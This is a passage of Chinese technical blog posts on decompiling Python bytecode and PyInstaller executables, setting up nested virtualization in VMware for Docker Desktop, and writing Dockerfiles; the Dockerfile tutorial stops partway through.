<h3 id="使用uncompyle6"><a href="#使用uncompyle6" class="headerlink" title="使用uncompyle6"></a>使用uncompyle6</h3><h4 id="安装库"><a href="#安装库" class="headerlink" title="安装库"></a>安装库</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install uncompyle6</span><br></pre></td></tr></table></figure>
<h4 id="反编译命令"><a href="#反编译命令" class="headerlink" title="反编译命令"></a>反编译命令</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">uncompyle6 xxx.pyc&gt;xxx.py</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uncompyle6 -o xxx.py xxx.pyc</span><br></pre></td></tr></table></figure>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>对于不是pyc后缀结尾的文件，使用uncompyle6反编译时会报出 <em>must point to a Python source that can be compiled, or Python bytecode (.pyc, .pyo)</em> 的错误。</p>
<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.zhihu.com/question/22842559">.pyc反编译为.py</a></p>
<h2 id="py—-gt-exe"><a href="#py—-gt-exe" class="headerlink" title="py—&gt;exe"></a>py—&gt;exe</h2><h3 id="使用pyinstaller"><a href="#使用pyinstaller" class="headerlink" title="使用pyinstaller"></a>使用pyinstaller</h3><h4 id="安装库-1"><a href="#安装库-1" class="headerlink" title="安装库"></a>安装库</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure>
<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> say_hello <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;程序开始执行&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(say_hello(<span class="string">&#x27;孙悟空&#x27;</span>))</span><br><span class="line"><span class="comment"># 增加调用main()函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="生成单个的可执行文件"><a href="#生成单个的可执行文件" class="headerlink" title="生成单个的可执行文件"></a>生成单个的可执行文件</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyinstaller -F app.py</span><br></pre></td></tr></table></figure>
<p>执行上面命令，将看到详细的生成过程。当生成完成后，将会在此 app 目录下看到多了一个 dist 目录，并在该目录下看到有一个 app.exe 文件，这就是使用 PyInstaller 工具生成的 EXE 程序。</p>
<p>在命令行窗口中进入 dist 目录下，在该目录执行 app.exe ，由于该程序没有图形用户界面，因此如果读者试图通过双击来运行该程序，则只能看到程序窗口一闪就消失了，这样将无法看到该程序的输出结果。</p>
<h4 id="生成一个目录（包含多个文件）作为可执行程序"><a href="#生成一个目录（包含多个文件）作为可执行程序" class="headerlink" title="生成一个目录（包含多个文件）作为可执行程序"></a>生成一个目录（包含多个文件）作为可执行程序</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pyinstaller -D app.py</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">-h，—help</th>
<th>查看该模块的帮助信息</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">-F，-onefile</td>
<td>产生单个的可执行文件</td>
</tr>
<tr>
<td style="text-align:left">-D，—onedir</td>
<td>产生一个目录（包含多个文件）作为可执行程序</td>
</tr>
<tr>
<td style="text-align:left">-a，—ascii</td>
<td>不包含 Unicode 字符集支持</td>
</tr>
<tr>
<td style="text-align:left">-d，—debug</td>
<td>产生 debug 版本的可执行文件</td>
</tr>
<tr>
<td style="text-align:left">-w，—windowed，—noconsolc</td>
<td>指定程序运行时不显示命令行窗口（仅对 Windows 有效）</td>
</tr>
<tr>
<td style="text-align:left">-c，—nowindowed，—console</td>
<td>指定使用命令行窗口运行程序（仅对 Windows 有效）</td>
</tr>
<tr>
<td style="text-align:left">-o DIR，—out=DIR</td>
<td>指定 spec 文件的生成目录。如果没有指定，则默认使用当前目录来生成 spec 文件</td>
</tr>
<tr>
<td style="text-align:left">-p DIR，—path=DIR</td>
<td>设置 Python 导入模块的路径（和设置 PYTHONPATH 环境变量的作用相似）。也可使用路径分隔符（Windows 使用分号，Linux 使用冒号）来分隔多个路径</td>
</tr>
<tr>
<td style="text-align:left">-n NAME，—name=NAME</td>
<td>指定项目（产生的 spec）名字。如果省略该选项，那么第一个脚本的主文件名将作为 spec 的名字</td>
</tr>
<tr>
<td style="text-align:left">-k  —key</td>
<td>加密打包，需要使用pycrypto库</td>
</tr>
</tbody>
</table>
</div>
<h4 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h4><p>pycryprodome库与pyinstaller不兼容，解决方案参考以下文章。</p>
<p><a href="https://blog.csdn.net/wn0112/article/details/107538700">[Python] Pyinstaller 使用 —key 参数后程序无法运行</a></p>
<p><a href="https://blog.csdn.net/JasonGe1984/article/details/104756776">pyinstaller —key加密打包问题</a></p>
<p><a href="https://blog.csdn.net/qq_16166591/article/details/100624505">pycrypto打包错误</a></p>
<h4 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="http://c.biancheng.net/view/2690.html">Python PyInstaller安装和使用教程（详解版）</a></p>
<h2 id="exe—-gt-pyc—-gt-py"><a href="#exe—-gt-pyc—-gt-py" class="headerlink" title="exe—&gt;pyc—&gt;py"></a>exe—&gt;pyc—&gt;py</h2><h3 id="使用pyinstxtractor"><a href="#使用pyinstxtractor" class="headerlink" title="使用pyinstxtractor"></a>使用pyinstxtractor</h3><h4 id="下载并使用pyinstxtractor解包"><a href="#下载并使用pyinstxtractor解包" class="headerlink" title="下载并使用pyinstxtractor解包"></a>下载并使用pyinstxtractor解包</h4><p>地址：<a href="https://github.com/extremecoders-re/pyinstxtractor">extremecoders-re</a></p>
<p>使用git</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://ghproxy.com/https://github.com/extremecoders-re/pyinstxtractor.git</span><br></pre></td></tr></table></figure>
<p>命令行执行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python ./pyinstxtractor/pyinstxtractor.py ./task.exe</span><br></pre></td></tr></table></figure>
<p>运行后生成<code>xx.exe_extracted</code>文件夹 ，里面有一堆<code>dll</code> ,<code>pyd</code>等文件，我们需要注意的是里面有一个<code>xxx.exe.manifest</code>文件，<code>xxx</code>可能与你的exe文件名不同，但这才是它的真实名字。然后<strong>找到一个叫<code>xxx</code>的没有后缀名的文件</strong>，它其实就是你之前打包的那个<code>.py</code>文件对应的<code>pyc</code>文件。</p>
<p>我们还注意到此目录下还有一个<code>PYZ-00.pyz_extracted</code>文件夹，里面都是引入的<strong>依赖库</strong>，当然，我们自己写的<code>mylib.py</code>也在其中，它也是我们反编译的对象。</p>
<h4 id="反编译pyc"><a href="#反编译pyc" class="headerlink" title="反编译pyc"></a>反编译pyc</h4><p>但直接将我们找到的<code>pyc</code>文件上传会发现无法反编译。原因是什么呢？我们用<strong>十六进制编辑器</strong>（大家网上搜就行，我这里用的是winhex，之前直接运行<code>py</code>文件生成的<code>pyc</code>文件比较。</p>
<p>发现唯一的差别就是<strong>少了第一行16个字节</strong>（叫做 <em>magic number</em> 表示python的版本和编译时间），那我们把它加上是不是就能正常解析了呢？确实是这样，但没有原始<code>pyc</code>文件怎么办？我们再到<code>xx.exe_extracted</code>文件夹里找一找。会发现有一个叫<code>struct</code>的文件，我们给他加上后缀<code>.pyc</code>反编译试试。成功了。</p>
<p>这就说明它的 <em>magic number</em> 是正确的，那我们只要把它的前16个字节复制过去不就行了？我们再来试试，成了！<code>main.py</code>中的内容被成功反编译出来了。</p>
<p>下面同理也能反编译出<code>mylib.py</code>等依赖库中的内容，不过值得<strong>注意</strong>的是，网上很多教程都没有提到<strong>依赖库的<code>pyc</code>文件缺少的字节数与主程序的不同！！！</strong></p>
<p><strong>反编译成功！</strong>不过中文字符被解析成了Unicode编码，可以再使用相应工具转换。</p>
<h4 id="参考链接-3"><a href="#参考链接-3" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://zhuanlan.zhihu.com/p/109266820">谈谈 Pyinstaller 的编译和反编译，如何保护你的代码</a></p>
]]></content>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟化嵌套搭建指南</title>
    <url>/2022/10/13/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%B5%8C%E5%A5%97%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="虚拟化嵌套搭建指南"><a href="#虚拟化嵌套搭建指南" class="headerlink" title="虚拟化嵌套搭建指南"></a>虚拟化嵌套搭建指南</h1><p>说通俗点，在虚拟机中使用hyper-v</p>
<span id="more"></span>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        作为一个docker使用者，在开发和调试的过程中使用繁琐的命令行是比较折磨的。尤其是像我这种对命令不熟悉的小白，每次都要翻越手册和笔记。于是，docker官方提供了能运行在3个系统上的docker desktop，并且随着版本不断地更新和迭代，docker desktop已经能覆盖绝大多数学习时用到的命令，极大程度简化了学习成本。</p>
<p>​        可以这么说，如果你是刚入门的小白，把docker基础命令过一遍，然后再去使用docker desktop，可以让你直接成为一个半资深的docker使用者。</p>
<p>​        但是，由于docker desktop安装时默认安装c盘，只能通过软连接的方式把应用装到其他盘里，再通过一系列高端技巧把镜像仓库也运到别的盘里（反正我失败了）。而我们知道，往往一个镜像就几百MB甚至几GB的大小，下载下来后，你还需要本地进行修改保存。这样下来，docker吃起空间来完全是不讲道理的。那么能不能把docker desktop扔到移动硬盘上去，即插即用呢？</p>
<p>​        于是，我想到了使用虚拟机VMware Station 16 pro，搭建一台win10虚拟机，并把它储存在移动硬盘上。正巧的是，微软官网最近也写了相关的文章，进一步证明了这一操作的可行性。</p>
<p><a href="https://learn.microsoft.com/zh-cn/virtualization/hyper-v-on-windows/tlfs/nested-virtualization">嵌套虚拟化</a></p>
<p><a href="https://learn.microsoft.com/zh-cn/virtualization/hyper-v-on-windows/user-guide/nested-virtualization">借助嵌套虚拟化在虚拟机中运行 Hyper-V</a></p>
<h2 id="本机操作流程"><a href="#本机操作流程" class="headerlink" title="本机操作流程"></a>本机操作流程</h2><h3 id="检查本机cpu是否开启虚拟机"><a href="#检查本机cpu是否开启虚拟机" class="headerlink" title="检查本机cpu是否开启虚拟机"></a>检查本机cpu是否开启虚拟机</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671530871185-e4b3b914-3fb0-4844-bab1-bacc9a853586.png" alt="image-20221013133435372"></p>
<p>这个没什么好说的，默认都开了，没开的去BIOS里慢慢折腾吧。</p>
<h3 id="更新VMware到最新版本"><a href="#更新VMware到最新版本" class="headerlink" title="更新VMware到最新版本"></a>更新VMware到最新版本</h3><p>（当前为16.2.4 build-20089737）</p>
<p>大坑来了。在更新的过程中，疯狂提示这个报错</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671530875941-4620ab1a-99a9-46fb-9274-504fb3821cd7.png" alt="image-20221013133834326"></p>
<p>笑嘻了，这不有手就行？</p>
<p>点开这个，找个最新的下载一下，重启一下，完事咯~</p>
<p><a href="https://learn.microsoft.com/en-US/cpp/windows/latest-supported-vc-redist?view=msvc-170">Microsoft Visual C++ Redistributable latest supported downloads</a></p>
<p>感觉就是在侮辱我的智商。找个x64版本下载、安装、重启，点开VMware的更新，依然报这个错。于是折腾了一下午，想了很多可能出现问题的地方，依然无果。就是因为这个报错，差点直接让我放弃了进一步操作的念头。因为我也没有经验，只不过在零星的资料中，判断这一步可能是比较关键的一步。</p>
<p>那么这个bug到底是怎么解决的呢？</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671530880479-3ab1b8f2-a183-456f-8db7-0f00fb1c07df.png" alt="image-20221013134556235"></p>
<p>麻了，在刚刚的链接里找个x86版本下载、安装、重启，更新完毕。焯！</p>
<h3 id="升级虚拟机"><a href="#升级虚拟机" class="headerlink" title="升级虚拟机"></a>升级虚拟机</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671530884241-ab8e1d03-3c7b-45f5-8450-c719e23dc5d5.png" alt="image-20221013134759053"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671530887427-3725078e-14f7-4f0d-b2a5-a445a998055b.png" alt="image-20221013135256244"></p>
<h3 id="更改虚拟机设置"><a href="#更改虚拟机设置" class="headerlink" title="更改虚拟机设置"></a>更改虚拟机设置</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671530894722-a1f8ebe9-3b20-470f-a671-8b1691a3e603.png" alt="image-20221013135533199"></p>
<p>在处理器的虚拟化引擎里勾选第一项。然后看看能不能开启虚拟机。当然，如果这个时候启动成功没有报错，那么恭喜，你已经成功了。</p>
<h3 id="启动时报错此平台不支持虚拟化的Intel-VT-x-EPT"><a href="#启动时报错此平台不支持虚拟化的Intel-VT-x-EPT" class="headerlink" title="启动时报错此平台不支持虚拟化的Intel VT-x/EPT"></a>启动时报错此平台不支持虚拟化的Intel VT-x/EPT</h3><p>第二个大坑来了</p>
<h4 id="启用或关闭windows功能"><a href="#启用或关闭windows功能" class="headerlink" title="启用或关闭windows功能"></a>启用或关闭windows功能</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">功能名称</th>
<th style="text-align:center">开关状态</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Windows沙盒</td>
<td style="text-align:center">关闭</td>
</tr>
<tr>
<td style="text-align:center">Hyper-V(家庭版是没有的)</td>
<td style="text-align:center">关闭</td>
</tr>
<tr>
<td style="text-align:center">虚拟机平台</td>
<td style="text-align:center">打开</td>
</tr>
</tbody>
</table>
</div>
<h4 id="关闭内核隔离"><a href="#关闭内核隔离" class="headerlink" title="关闭内核隔离"></a>关闭内核隔离</h4><p>打开Windows安全中心&gt;设备安全性&gt;内核隔离，关闭</p>
<h4 id="cmd输入"><a href="#cmd输入" class="headerlink" title="cmd输入"></a>cmd输入</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> hypervisorlaunchtype off</span><br></pre></td></tr></table></figure>
<h4 id="重启电脑"><a href="#重启电脑" class="headerlink" title="重启电脑"></a>重启电脑</h4><p>此时再次打开虚拟机，应该没有什么问题了</p>
<h2 id="win10虚拟机操作流程"><a href="#win10虚拟机操作流程" class="headerlink" title="win10虚拟机操作流程"></a>win10虚拟机操作流程</h2><p>这个就是正常的安装docker的操作了，没什么难点和坑点，在我之前的笔记里也有详细地介绍。</p>
<h3 id="方便本机访问虚拟机"><a href="#方便本机访问虚拟机" class="headerlink" title="方便本机访问虚拟机"></a>方便本机访问虚拟机</h3><p>桥接+复制，开机后ipconfig即可。</p>
<h3 id="启动docker-desktop报错wsl出了问题"><a href="#启动docker-desktop报错wsl出了问题" class="headerlink" title="启动docker desktop报错wsl出了问题"></a>启动docker desktop报错wsl出了问题</h3><p>下载一个wsl.msi，安装完重启一下虚拟机即可。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/weixin_44047784/article/details/122209100">VMWare安装报错：此安装程序要求您重新启动系统以完成 Microsoft VC Redistributable安装，然后重新运行该安装程序。</a></p>
<p><a href="https://blog.csdn.net/u013511036/article/details/126049334">此平台不支持虚拟化的Intel VT-x/EPT</a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用秘籍(2)</title>
    <url>/2022/06/22/Docker%E4%BD%BF%E7%94%A8%E7%A7%98%E7%B1%8D-2/</url>
    <content><![CDATA[<h1 id="Docker使用秘籍（2）"><a href="#Docker使用秘籍（2）" class="headerlink" title="Docker使用秘籍（2）"></a>Docker使用秘籍（2）</h1><p>本部分介绍Dockerfile的编写。</p>
<span id="more"></span>
<h2 id="Dockerfile使用方法"><a href="#Dockerfile使用方法" class="headerlink" title="Dockerfile使用方法"></a>Dockerfile使用方法</h2><h3 id="利用dockerfile构筑一个镜像"><a href="#利用dockerfile构筑一个镜像" class="headerlink" title="利用dockerfile构筑一个镜像"></a>利用dockerfile构筑一个镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t nginx:v3 .</span><br></pre></td></tr></table></figure>
<h4 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h4><p><code>.</code>表示上下文路径。请勿将无用文件放入路径中，这样会导致镜像过大。</p>
<h3 id="dockerfile基本语法"><a href="#dockerfile基本语法" class="headerlink" title="dockerfile基本语法"></a>dockerfile基本语法</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install wget \</span></span><br><span class="line"><span class="bash">    &amp;&amp; wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; tar -xvf redis.tar.gz</span></span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大.</p>
<h3 id="dockerfile指令简洁版摘要"><a href="#dockerfile指令简洁版摘要" class="headerlink" title="dockerfile指令简洁版摘要"></a>dockerfile指令简洁版摘要</h3><div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>FROM</strong></td>
<td>构建镜像基于哪个镜像</td>
</tr>
<tr>
<td>MAINTAINER</td>
<td>镜像维护者姓名或邮箱地址</td>
</tr>
<tr>
<td><strong>RUN</strong></td>
<td>构建镜像时运行的指令</td>
</tr>
<tr>
<td><strong>CMD</strong></td>
<td>运行容器时执行的shell环境</td>
</tr>
<tr>
<td>VOLUME</td>
<td>指定容器挂载点到宿主机自动生成的目录或其他容器</td>
</tr>
<tr>
<td>USER</td>
<td>为RUN、CMD、和 ENTRYPOINT 执行命令指定运行用户</td>
</tr>
<tr>
<td><strong>WORKDIR</strong></td>
<td>为 RUN、CMD、ENTRYPOINT、COPY 和 ADD 设置工作目录，就是切换目录</td>
</tr>
<tr>
<td>HEALTHCHECH</td>
<td>健康检查</td>
</tr>
<tr>
<td>ARG</td>
<td>构建时指定的一些参数</td>
</tr>
<tr>
<td><strong>EXPOSE</strong></td>
<td>声明容器的服务端口（仅仅是声明）</td>
</tr>
<tr>
<td><strong>ENV</strong></td>
<td>设置容器环境变量</td>
</tr>
<tr>
<td>ADD</td>
<td>拷贝文件或目录到容器中，如果是URL或压缩包便会自动下载或自动解压</td>
</tr>
<tr>
<td><strong>COPY</strong></td>
<td>拷贝文件或目录到容器中，跟ADD类似，但不具备自动下载或解压的功能</td>
</tr>
<tr>
<td><strong>ENTRYPOINT</strong></td>
<td>运行容器时执行的shell命令</td>
</tr>
</tbody>
</table>
</div>
<h3 id="详细讲解"><a href="#详细讲解" class="headerlink" title="详细讲解"></a>详细讲解</h3><h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p>定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p>
<h4 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h4><p>用于执行后面跟着的命令行命令。有以下俩种格式：</p>
<p>shell:</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> &lt;命令行命令&gt;</span></span><br><span class="line"><span class="comment"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span></span><br></pre></td></tr></table></figure>
<p>exec:</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> [<span class="string">&quot;可执行文件&quot;</span>, <span class="string">&quot;参数1&quot;</span>, <span class="string">&quot;参数2&quot;</span>]</span></span><br><span class="line"><span class="comment"># 例如：</span></span><br><span class="line"><span class="comment"># RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</span></span><br></pre></td></tr></table></figure>
<h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> [--chown=&lt;user&gt;:&lt;group&gt;] [<span class="string">&quot;&lt;源路径1&gt;&quot;</span>,...  <span class="string">&quot;&lt;目标路径&gt;&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p><strong>[—chown=<user>:<group>]</strong>：可选参数，用户改变复制到容器内文件的拥有者和属组。</p>
<p><strong>&lt;源路径&gt;</strong>：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。</p>
<p><strong>&lt;目标路径&gt;</strong>：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。</p>
<h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>ADD 指令和 COPY 的使用格类似（同样需求下，官方推荐使用 COPY）。功能也类似，不同之处如下：</p>
<ul>
<li>ADD 的优点：在执行 &lt;源文件&gt; 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 &lt;目标路径&gt;。</li>
<li>ADD 的缺点：在不解压的前提下，无法复制 tar 压缩文件。会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。具体是否使用，可以根据是否需要自动解压来决定。</li>
</ul>
<h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:</p>
<ul>
<li>CMD 在docker run 时运行。</li>
<li>RUN 是在 docker build。</li>
</ul>
<p><strong>作用</strong>：为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。CMD 指令指定的程序可被 docker run 命令行参数中指定要运行的程序所覆盖。</p>
<p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> &lt;shell 命令&gt; </span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;&lt;可执行文件或命令&gt;&quot;</span>,<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...] </span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...]  <span class="comment"># 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span></span></span><br></pre></td></tr></table></figure>
<p>推荐使用第二种格式，执行过程比较明确。第一种格式实际上在运行的过程中也会自动转换成第二种格式运行，并且默认可执行文件是 sh。</p>
<h4 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h4><p>类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序。</p>
<p>但是, 如果运行 docker run 时使用了 —entrypoint 选项，将覆盖 ENTRYPOINT 指令指定的程序。</p>
<p><strong>优点</strong>：在执行 docker run 的时候可以指定 ENTRYPOINT 运行所需的参数。</p>
<p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;&lt;executeable&gt;&quot;</span>,<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...]</span></span><br></pre></td></tr></table></figure>
<p>可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参。</p>
<h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p>设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENV</span> &lt;key&gt; &lt;value&gt;</span><br><span class="line"><span class="keyword">ENV</span> &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</span><br></pre></td></tr></table></figure>
<h4 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h4><p>构建参数，与 ENV 作用一致。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。</p>
<p>构建命令 docker build 中可以用 —build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ARG</span> &lt;参数名&gt;[=&lt;默认值&gt;]</span><br></pre></td></tr></table></figure>
<h4 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h4><p>定义匿名数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷。</p>
<p>作用：</p>
<ul>
<li>避免重要的数据，因容器重启而丢失，这是非常致命的。</li>
<li>避免容器不断变大。</li>
</ul>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;&lt;路径1&gt;&quot;</span>, <span class="string">&quot;&lt;路径2&gt;&quot;</span>...]</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> &lt;路径&gt;</span></span><br></pre></td></tr></table></figure>
<p>在启动容器 docker run 的时候，我们可以通过 -v 参数修改挂载点。</p>
<h4 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h4><p>仅仅只是声明端口。</p>
<p>作用：</p>
<ul>
<li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。</li>
<li>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</li>
</ul>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXPOSE</span> &lt;端口<span class="number">1</span>&gt; [&lt;端口<span class="number">2</span>&gt;...]</span><br></pre></td></tr></table></figure>
<h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。</p>
<p>docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> &lt;工作目录路径&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h4><p>用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（用户和用户组必须提前已经存在）。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">USER</span> &lt;用户名&gt;[:&lt;用户组&gt;]</span><br></pre></td></tr></table></figure>
<h4 id="HEALTHCHECK"><a href="#HEALTHCHECK" class="headerlink" title="HEALTHCHECK"></a>HEALTHCHECK</h4><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态。</p>
<p>格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">HEALTHCHECK</span><span class="bash"> [选项] CMD &lt;命令&gt;：设置检查容器健康状况的命令</span></span><br><span class="line"><span class="keyword">HEALTHCHECK</span><span class="bash"> NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">HEALTHCHECK</span><span class="bash"> [选项] CMD &lt;命令&gt; : 这边 CMD 后面跟随的命令使用，可以参考 CMD 的用法。</span></span><br></pre></td></tr></table></figure>
<h4 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h4><p>用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为  test-build）。当有新的 Dockerfile 使用了之前构建的镜像 FROM test-build ，这时执行新镜像的  Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 ONBUILD 指定的命令。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ONBUILD</span> &lt;其它指令&gt;</span><br></pre></td></tr></table></figure>
<h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p>LABEL 指令用来给镜像添加一些元数据（metadata），以键值对的形式，语法格式如下：</p>
